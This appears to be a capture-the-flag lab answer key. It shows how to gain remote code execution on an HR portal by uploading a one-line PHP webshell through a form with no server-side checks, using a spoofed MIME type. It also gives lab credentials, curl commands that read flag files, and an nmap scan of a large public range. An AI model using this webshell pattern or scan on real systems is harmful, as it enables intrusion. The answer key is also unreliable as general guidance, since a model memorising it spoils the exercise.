# M3 — Red Team Solution: Unrestricted File Upload → Webshell RCE

**Machine:** aglg-hrportal | **Port:** 8080/tcp | **MITRE:** T1190, T1059.004

---

## Step 1 — Access (SSH or Direct)

From M2: `ssh hr_ops@<M3-IP>` with password `HR0ps@AGLG24`

Or exploit the web upload directly:

---

## Step 2 — Web Upload: Webshell Deploy

Navigate to `http://<M3-IP>:8080/login.php`

Login: `hr_ops` / `HR0ps@AGLG24`

Go to **Document Upload** at `/upload.php`

The upload form has `accept="..."` as a client-side hint ONLY. The server performs no MIME or extension validation.

**Create a PHP webshell:**
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Upload `shell.php` via the browser (bypass client-side accept filter: remove accept attr in DevTools, or use curl):

```bash
curl -s -b 'PHPSESSID=<your-session-cookie>' \
  -F "document=@shell.php;type=application/pdf" \
  -F "doc_type=Employment+Contract" \
  http://<M3-IP>:8080/upload.php
```

---

## Step 3 — Trigger Webshell + Read Flag

```bash
# Verify webshell works
curl "http://<M3-IP>:8080/uploads/shell.php?cmd=id"
# → uid=33(www-data)

# Read flag
curl "http://<M3-IP>:8080/uploads/shell.php?cmd=cat+/opt/aglg/flag3.txt"

# Read pivot hint
curl "http://<M3-IP>:8080/uploads/shell.php?cmd=cat+/opt/aglg/hint_m4.txt"
```

---

## Step 4 — Pivot to M4

Hint: `netops : N3t0ps@Mon1t0r` → scan `nmap -p 5000 195.0.0.0/8`

---

## Flag
- `FLAG{<hex>_webshell_rce}` — at `/opt/aglg/flag3.txt`
